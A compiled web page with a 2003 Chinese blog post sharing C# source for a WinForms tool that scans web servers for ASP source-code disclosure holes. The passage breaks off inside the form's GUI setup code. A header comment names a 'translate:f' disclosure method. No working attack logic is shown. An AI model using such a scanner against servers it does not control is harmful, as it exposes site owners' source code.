import{_ as n,o as s,c as a,a as t}from"./app-477de5b2.js";const p={},o=t(`<h1 id="一个用c-写的扫描asp源码漏洞的应用程序" tabindex="-1"><a class="header-anchor" href="#一个用c-写的扫描asp源码漏洞的应用程序" aria-hidden="true">#</a> 一个用c#写的扫描asp源码漏洞的应用程序</h1><blockquote><p>你是第71位浏览该文章的人 不详 不详 2003-3-31</p></blockquote><p>这儿就是昨天说的那个程序主要部分的源代码，如果要全部代码请到我的主页去下载。</p><p>贴不开，分两次。</p><div class="language-csharp" data-ext="cs"><pre class="language-csharp"><code><span class="token comment">//--------------------------------------------------------------------------</span>
<span class="token comment">//</span>
<span class="token comment">// file name : form1.cs</span>
<span class="token comment">//</span>
<span class="token comment">// description : 主form</span>
<span class="token comment">//</span>
<span class="token comment">// date: 2001/1/3</span>
<span class="token comment">//</span>
<span class="token comment">// author : bigeagle@163.net</span>
<span class="token comment">// http://bigeagle.yeah.net</span>
<span class="token comment">//</span>
<span class="token comment">// history : 2000/1/3 version 0.9</span>
<span class="token comment">//</span>
<span class="token comment">// ToDo: translate:f 方法似乎有问题，等得到有关http协议的资料在修改</span>
<span class="token comment">//</span>
<span class="token comment">//-------------------------------------------------------------------------</span>
<span class="token keyword">namespace</span> <span class="token namespace">findbug</span>
<span class="token punctuation">{</span>
    <span class="token keyword">using</span> <span class="token namespace">System</span><span class="token punctuation">;</span>
    <span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Drawing</span><span class="token punctuation">;</span>
    <span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Collections</span><span class="token punctuation">;</span>
    <span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>ComponentModel</span><span class="token punctuation">;</span>
    <span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>WinForms</span><span class="token punctuation">;</span>
    <span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Data</span><span class="token punctuation">;</span>
    <span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Net</span><span class="token punctuation">;</span>
    <span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>IO</span><span class="token punctuation">;</span>
    <span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Text</span><span class="token punctuation">;</span>
    <span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>Sockets</span><span class="token punctuation">;</span>

    <span class="token doc-comment comment">/// <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>summary</span><span class="token punctuation">&gt;</span></span></span>
    <span class="token doc-comment comment">/// Summary description for Form1.</span>
    <span class="token doc-comment comment">/// <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>summary</span><span class="token punctuation">&gt;</span></span></span>
    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Form1</span> <span class="token punctuation">:</span> <span class="token type-list"><span class="token class-name">System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>Form</span></span>
    <span class="token punctuation">{</span>
        <span class="token doc-comment comment">/// <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>summary</span><span class="token punctuation">&gt;</span></span></span>
        <span class="token doc-comment comment">/// Required designer variable.</span>
        <span class="token doc-comment comment">/// <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>summary</span><span class="token punctuation">&gt;</span></span></span>
        <span class="token keyword">private</span> <span class="token class-name">System<span class="token punctuation">.</span>ComponentModel<span class="token punctuation">.</span>Container</span> components<span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token class-name">System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>StatusBar</span> barStatus<span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token class-name">System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>Button</span> btnClear<span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token class-name">System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>TextBox</span> txtResult<span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token class-name">System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>Button</span> btnGo<span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token class-name">System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>Label</span> label3<span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token class-name">System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>ComboBox</span> cboMethod<span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token class-name">System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>TextBox</span> txtFileName<span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token class-name">System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>Label</span> label2<span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token class-name">System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>TextBox</span> txtServer<span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token class-name">System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>Label</span> label1<span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token class-name">System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>MenuItem</span> mnuExit<span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token class-name">System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>MenuItem</span> menuItem1<span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token class-name">System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>MenuItem</span> mnuNew<span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token class-name">System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>MenuItem</span> mnuAbount<span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token class-name">System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>MenuItem</span> mnuHelp<span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token class-name">System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>MenuItem</span> mnuSave<span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token class-name">System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>MenuItem</span> mnuFile<span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token class-name">System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>MainMenu</span> mainMenu1<span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token function">Form1</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token comment">//</span>
            <span class="token comment">// Required for Windows Form Designer support</span>
            <span class="token comment">//</span>
            <span class="token function">InitializeComponent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token comment">//初始化窗口</span>
            <span class="token function">InitForm</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">Dispose</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token keyword">base</span><span class="token punctuation">.</span><span class="token function">Dispose</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            components<span class="token punctuation">.</span><span class="token function">Dispose</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">//初始化控件</span>
        <span class="token keyword">private</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">InitializeComponent</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>components <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>ComponentModel<span class="token punctuation">.</span>Container</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>mnuSave <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>MenuItem</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>mnuNew <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>MenuItem</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>cboMethod <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>ComboBox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>btnGo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>Button</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>menuItem1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>MenuItem</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>mnuFile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>MenuItem</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>txtServer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>TextBox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>mnuHelp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>MenuItem</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>btnClear <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>Button</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>label2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>Label</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>label1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>Label</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>mnuAbount <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>MenuItem</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>barStatus <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>StatusBar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>mainMenu1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>MainMenu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>mnuExit <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>MenuItem</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>txtResult <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>TextBox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>label3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>Label</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>txtFileName <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>TextBox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            mnuSave<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">&quot;保存&quot;</span><span class="token punctuation">;</span>
            mnuSave<span class="token punctuation">.</span>Shortcut <span class="token operator">=</span> System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>Shortcut<span class="token punctuation">.</span>CtrlS<span class="token punctuation">;</span>
            mnuSave<span class="token punctuation">.</span>Index <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
            mnuNew<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">&quot;新建&quot;</span><span class="token punctuation">;</span>
            mnuNew<span class="token punctuation">.</span>Shortcut <span class="token operator">=</span> System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>Shortcut<span class="token punctuation">.</span>F2<span class="token punctuation">;</span>
            mnuNew<span class="token punctuation">.</span>Index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
            mnuNew<span class="token punctuation">.</span>Click <span class="token operator">+=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>EventHandler</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>mnuNew_Click<span class="token punctuation">)</span><span class="token punctuation">;</span>
            cboMethod<span class="token punctuation">.</span>Location <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>Drawing<span class="token punctuation">.</span>Point</span><span class="token punctuation">(</span><span class="token number">96</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            cboMethod<span class="token punctuation">.</span>Size <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>Drawing<span class="token punctuation">.</span>Size</span><span class="token punctuation">(</span><span class="token number">121</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            cboMethod<span class="token punctuation">.</span>TabIndex <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
            btnGo<span class="token punctuation">.</span>Location <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>Drawing<span class="token punctuation">.</span>Point</span><span class="token punctuation">(</span><span class="token number">296</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            btnGo<span class="token punctuation">.</span>Size <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>Drawing<span class="token punctuation">.</span>Size</span><span class="token punctuation">(</span><span class="token number">75</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            btnGo<span class="token punctuation">.</span>TabIndex <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>
            btnGo<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">&quot;让我看&quot;</span><span class="token punctuation">;</span>
            btnGo<span class="token punctuation">.</span>Click <span class="token operator">+=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>EventHandler</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>btnGo_Click<span class="token punctuation">)</span><span class="token punctuation">;</span>
            menuItem1<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">&quot;-&quot;</span><span class="token punctuation">;</span>
            menuItem1<span class="token punctuation">.</span>Index <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
            mnuFile<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">&quot;文件(&amp;F)&quot;</span><span class="token punctuation">;</span>
            mnuFile<span class="token punctuation">.</span>Index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
            mnuFile<span class="token punctuation">.</span>MenuItems<span class="token punctuation">.</span>All <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>MenuItem</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> <span class="token keyword">this</span><span class="token punctuation">.</span>mnuNew<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>mnuSave<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>menuItem1<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>mnuExit <span class="token punctuation">}</span><span class="token punctuation">;</span>
            txtServer<span class="token punctuation">.</span>Location <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>Drawing<span class="token punctuation">.</span>Point</span><span class="token punctuation">(</span><span class="token number">96</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            txtServer<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">&quot;http://&quot;</span><span class="token punctuation">;</span>
            txtServer<span class="token punctuation">.</span>TabIndex <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
            txtServer<span class="token punctuation">.</span>Size <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>Drawing<span class="token punctuation">.</span>Size</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            mnuHelp<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">&quot;帮助(&amp;H)&quot;</span><span class="token punctuation">;</span>
            mnuHelp<span class="token punctuation">.</span>Index <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
            mnuHelp<span class="token punctuation">.</span>MenuItems<span class="token punctuation">.</span>All <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>MenuItem</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> <span class="token keyword">this</span><span class="token punctuation">.</span>mnuAbount <span class="token punctuation">}</span><span class="token punctuation">;</span>
            btnClear<span class="token punctuation">.</span>Location <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>Drawing<span class="token punctuation">.</span>Point</span><span class="token punctuation">(</span><span class="token number">408</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            btnClear<span class="token punctuation">.</span>Size <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>Drawing<span class="token punctuation">.</span>Size</span><span class="token punctuation">(</span><span class="token number">75</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            btnClear<span class="token punctuation">.</span>TabIndex <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>
            btnClear<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">&quot;清空&quot;</span><span class="token punctuation">;</span>
            btnClear<span class="token punctuation">.</span>Click <span class="token operator">+=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>EventHandler</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>btnClear_Click<span class="token punctuation">)</span><span class="token punctuation">;</span>
            label2<span class="token punctuation">.</span>Location <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>Drawing<span class="token punctuation">.</span>Point</span><span class="token punctuation">(</span><span class="token number">224</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            label2<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">&quot;文件名：&quot;</span><span class="token punctuation">;</span>
            label2<span class="token punctuation">.</span>Size <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>Drawing<span class="token punctuation">.</span>Size</span><span class="token punctuation">(</span><span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            label2<span class="token punctuation">.</span>Font <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>Drawing<span class="token punctuation">.</span>Font</span><span class="token punctuation">(</span><span class="token string">&quot;宋体&quot;</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            label2<span class="token punctuation">.</span>TabIndex <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
            label1<span class="token punctuation">.</span>Location <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>Drawing<span class="token punctuation">.</span>Point</span><span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            label1<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">&quot;主机名：&quot;</span><span class="token punctuation">;</span>
            label1<span class="token punctuation">.</span>Size <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>Drawing<span class="token punctuation">.</span>Size</span><span class="token punctuation">(</span><span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            label1<span class="token punctuation">.</span>Font <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>Drawing<span class="token punctuation">.</span>Font</span><span class="token punctuation">(</span><span class="token string">&quot;宋体&quot;</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            label1<span class="token punctuation">.</span>TabIndex <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
            mnuAbount<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">&quot;关于&quot;</span><span class="token punctuation">;</span>
            mnuAbount<span class="token punctuation">.</span>Shortcut <span class="token operator">=</span> System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>Shortcut<span class="token punctuation">.</span>CtrlA<span class="token punctuation">;</span>
            mnuAbount<span class="token punctuation">.</span>Index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
            mnuAbount<span class="token punctuation">.</span>Click <span class="token operator">+=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>EventHandler</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>mnuAbount_Click<span class="token punctuation">)</span><span class="token punctuation">;</span>
            barStatus<span class="token punctuation">.</span>BackColor <span class="token operator">=</span> System<span class="token punctuation">.</span>Drawing<span class="token punctuation">.</span>SystemColors<span class="token punctuation">.</span>Control<span class="token punctuation">;</span>
            barStatus<span class="token punctuation">.</span>Location <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>Drawing<span class="token punctuation">.</span>Point</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">423</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            barStatus<span class="token punctuation">.</span>Size <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>Drawing<span class="token punctuation">.</span>Size</span><span class="token punctuation">(</span><span class="token number">568</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            barStatus<span class="token punctuation">.</span>TabIndex <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">;</span>
            barStatus<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">&quot;就绪&quot;</span><span class="token punctuation">;</span>
            mainMenu1<span class="token punctuation">.</span>MenuItems<span class="token punctuation">.</span>All <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>MenuItem</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> <span class="token keyword">this</span><span class="token punctuation">.</span>mnuFile<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>mnuHelp <span class="token punctuation">}</span><span class="token punctuation">;</span>
            mnuExit<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">&quot;退出(&amp;X)&quot;</span><span class="token punctuation">;</span>
            mnuExit<span class="token punctuation">.</span>Shortcut <span class="token operator">=</span> System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>Shortcut<span class="token punctuation">.</span>AltF4<span class="token punctuation">;</span>
            mnuExit<span class="token punctuation">.</span>Index <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
            mnuExit<span class="token punctuation">.</span>Click <span class="token operator">+=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>EventHandler</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>mnuExit_Click<span class="token punctuation">)</span><span class="token punctuation">;</span>
            txtResult<span class="token punctuation">.</span>Location <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>Drawing<span class="token punctuation">.</span>Point</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">96</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            txtResult<span class="token punctuation">.</span>Multiline <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            txtResult<span class="token punctuation">.</span>ScrollBars <span class="token operator">=</span> System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>ScrollBars<span class="token punctuation">.</span>Both<span class="token punctuation">;</span>
            txtResult<span class="token punctuation">.</span>TabIndex <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span>
            txtResult<span class="token punctuation">.</span>Size <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>Drawing<span class="token punctuation">.</span>Size</span><span class="token punctuation">(</span><span class="token number">536</span><span class="token punctuation">,</span> <span class="token number">312</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            txtResult<span class="token punctuation">.</span>Visible <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            label3<span class="token punctuation">.</span>Location <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>Drawing<span class="token punctuation">.</span>Point</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            label3<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">&quot;使用&quot;</span><span class="token punctuation">;</span>
            label3<span class="token punctuation">.</span>Size <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>Drawing<span class="token punctuation">.</span>Size</span><span class="token punctuation">(</span><span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            label3<span class="token punctuation">.</span>Font <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>Drawing<span class="token punctuation">.</span>Font</span><span class="token punctuation">(</span><span class="token string">&quot;宋体&quot;</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            label3<span class="token punctuation">.</span>TabIndex <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>
